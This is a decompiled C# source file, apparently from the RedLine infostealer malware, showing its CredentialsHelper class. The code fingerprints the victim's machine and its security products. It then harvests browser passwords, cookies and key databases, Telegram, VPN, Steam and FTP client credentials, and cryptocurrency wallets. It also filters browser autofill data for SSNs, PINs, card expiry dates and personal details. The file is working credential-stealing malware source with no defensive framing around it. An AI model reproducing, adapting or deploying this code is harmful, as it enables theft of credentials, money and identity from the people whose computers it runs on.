using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Management;
using RedLine.Client.Logic.Others;
using RedLine.Client.Models;
using RedLine.Logic.Browsers.Chromium;
using RedLine.Logic.Browsers.Gecko;
using RedLine.Logic.FtpClients;
using RedLine.Logic.Helpers;
using RedLine.Logic.ImClient;
using RedLine.Logic.Others;
using RedLine.Models.Browsers;
using RedLine.Models.WMI;

namespace RedLine.Models
{
	// Token: 0x0200000B RID: 11
	public static class CredentialsHelper
	{
		// Token: 0x0600004F RID: 79 RVA: 0x000028BC File Offset: 0x00000ABC
		public static Credentials Create(ClientSettings settings)
		{
			Credentials credentials = new Credentials
			{
				Defenders = new List<string>(),
				Browsers = new List<Browser>(),
				Files = new List<RemoteFile>(),
				FtpConnections = new List<LoginPair>(),
				Hardwares = new List<Hardware>(),
				InstalledBrowsers = new List<InstalledBrowserInfo>(),
				InstalledSoftwares = new List<string>(),
				Languages = new List<string>(),
				Processes = new List<string>(),
				ColdWallets = new List<ColdWallet>(),
				ImportantAutofills = new List<Autofill>(),
				SteamFiles = new List<RemoteFile>(),
				NordVPN = new List<LoginPair>(),
				OpenVPN = new List<RemoteFile>(),
				ProtonVPN = new List<RemoteFile>(),
				TelegramFiles = new List<RemoteFile>()
			};
			try
			{
				try
				{
					ReadOnlyCollection<WmiProcessor> source = new WmiService().QueryAll<WmiProcessor>(new WmiProcessorQuery(), null);
					credentials.Hardwares = (from x in source
					select new Hardware
					{
						Caption = x.Name,
						HardType = HardwareType.Processor,
						Parameter = string.Format("{0}", x.NumberOfCores)
					}).ToList<Hardware>();
				}
				catch
				{
				}
				try
				{
					WmiService wmiService = new WmiService();
					if (credentials.Hardwares == null)
					{
						credentials.Hardwares = new List<Hardware>();
					}
					foreach (Hardware item in (from x in wmiService.QueryAll<WmiGraphicCard>(new WmiGraphicCardQuery(), null)
					where x.AdapterRAM > 0U
					select new Hardware
					{
						Caption = x.Name,
						HardType = HardwareType.Graphic,
						Parameter = string.Format("{0}", x.AdapterRAM)
					}).ToList<Hardware>())
					{
						credentials.Hardwares.Add(item);
					}
				}
				catch
				{
				}
				try
				{
					credentials.Hardwares.Add(new Hardware
					{
						Caption = "Total of RAM",
						HardType = HardwareType.Graphic,
						Parameter = UserInfoHelper.TotalOfRAM()
					});
				}
				catch
				{
				}
				try
				{
					WmiService wmiService2 = new WmiService();
					List<WmiQueryBase> list = new List<WmiQueryBase>
					{
						new WmiAntivirusQuery(),
						new WmiAntiSpyWareQuery(),
						new WmiFirewallQuery()
					};
					string[] array = new string[]
					{
						"ROOT\\SecurityCenter2",
						"ROOT\\SecurityCenter"
					};
					List<WmiAntivirus> list2 = new List<WmiAntivirus>();
					foreach (WmiQueryBase wmiQuery in list)
					{
						foreach (string scope in array)
						{
							try
							{
								list2.AddRange(wmiService2.QueryAll<WmiAntivirus>(wmiQuery, new ManagementObjectSearcher(scope, string.Empty)).ToList<WmiAntivirus>());
							}
							catch
							{
							}
						}
					}
					credentials.Defenders = (from x in list2
					select x.DisplayName).Distinct<string>().ToList<string>();
				}
				catch
				{
				}
				credentials.InstalledBrowsers = UserInfoHelper.GetBrowsers();
				credentials.Processes = UserInfoHelper.ListOfProcesses();
				credentials.InstalledSoftwares = UserInfoHelper.ListOfPrograms();
				credentials.Languages = UserInfoHelper.AvailableLanguages();
				if (settings.GrabTelegram)
				{
					credentials.TelegramFiles.AddRange(TelegramGrabber.ParseFiles());
				}
				if (settings.GrabVPN)
				{
					credentials.NordVPN.AddRange(NordVPN.GetProfile());
					credentials.OpenVPN.AddRange(OpenVPN.ParseFiles());
					credentials.ProtonVPN.AddRange(ProtonVPN.ParseFiles());
				}
				if (settings.GrabSteam)
				{
					credentials.SteamFiles.AddRange(SteamGrabber.ParseFiles());
				}
				if (settings.GrabBrowsers)
				{
					List<Browser> list3 = new List<Browser>();
					if (settings.PortablePaths == null)
					{
						settings.PortablePaths = new List<string>();
					}
					settings.PortablePaths.Add(Constants.RoamingAppData);
					settings.PortablePaths.Add(Constants.LocalAppData);
					List<string> list4 = new List<string>();
					List<string> list5 = new List<string>();
					foreach (string text in Constants.chromiumBrowserPaths)
					{
						string text2 = string.Empty;
						if (text.Contains("Opera"))
						{
							text2 = Constants.RoamingAppData + text;
						}
						else
						{
							text2 = Constants.LocalAppData + text;
						}
						if (Directory.Exists(text2))
						{
							foreach (string text3 in DecryptHelper.FindPaths(text2, 1, 1, new string[]
							{
								"Login Data",
								"Web Data",
								"Cookies"
							}))
							{
								if ((text3.EndsWith("Login Data") || text3.EndsWith("Web Data") || text3.EndsWith("Cookies")) && !list4.Contains(text3))
								{
									list4.Add(text3);
								}
							}
						}
					}
					foreach (string str in Constants.geckoBrowserPaths)
					{
						try
						{
							string text4 = Constants.RoamingAppData + str;
							if (Directory.Exists(text4))
							{
								foreach (string text5 in DecryptHelper.FindPaths(text4, 2, 1, new string[]
								{
									"key3.db",
									"key4.db",
									"cookies.sqlite",
									"logins.json"
								}))
								{
									if ((text5.EndsWith("key3.db") || text5.EndsWith("key4.db") || text5.EndsWith("cookies.sqlite") || text5.EndsWith("logins.json")) && !list5.Contains(text5))
									{
										list5.Add(text5);
									}
								}
							}
						}
						catch
						{
						}
					}
					list3.AddRange(ChromiumEngine.ParseBrowsers(list4));
					list3.AddRange(GeckoEngine.ParseBrowsers(list5));
					foreach (Browser browser in list3)
					{
						if (!browser.IsEmpty())
						{
							using (List<Autofill>.Enumerator enumerator6 = CredentialsHelper.FindImportant(browser.Autofills).GetEnumerator())
							{
								while (enumerator6.MoveNext())
								{
									Autofill autofill = enumerator6.Current;
									if (!credentials.ImportantAutofills.Any((Autofill x) => x.Name == autofill.Name && x.Value == autofill.Value))
									{
										credentials.ImportantAutofills.Add(autofill);
									}
								}
							}
							credentials.Browsers.Add(browser);
						}
					}
				}
				if (settings.GrabWallets)
				{
					List<ColdWallet> list6 = new List<ColdWallet>();
					list6.AddRange(ColdWalletsGrabber.ParseFiles());
					foreach (ColdWallet item2 in list6)
					{
						credentials.ColdWallets.Add(item2);
					}
				}
				if (settings.GrabFiles)
				{
					credentials.Files = RemoteFileGrabber.ParseFiles(settings.GrabPaths, null);
				}
				if (settings.GrabFTP)
				{
					List<LoginPair> list7 = new List<LoginPair>();
					list7.AddRange(FileZilla.ParseConnections());
					list7.AddRange(WinSCP.ParseConnections());
					credentials.FtpConnections = list7;
				}
				if (settings.GrabImClients)
				{
					foreach (LoginPair item3 in Pidgin.ParseConnections())
					{
						credentials.FtpConnections.Add(item3);
					}
				}
			}
			catch (Exception)
			{
			}
			return credentials;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000031DC File Offset: 0x000013DC
		public static List<Autofill> FindImportant(IList<Autofill> autofills)
		{
			List<Autofill> list = new List<Autofill>();
			try
			{
				if (autofills == null)
				{
					return list;
				}
				if (autofills.Count == 0)
				{
					return list;
				}
				string[] array = new string[]
				{
					"last_name",
					"first_name",
					"phone_number",
					"address",
					"dob",
					"email",
					"firstName",
					"lastName",
					"ssn",
					"pin",
					"security",
					"expireDate",
					"expirationDate"
				};
				foreach (Autofill autofill in autofills)
				{
					foreach (string value in array)
					{
						if (autofill.Name.Contains(value))
						{
							list.Add(autofill);
							break;
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
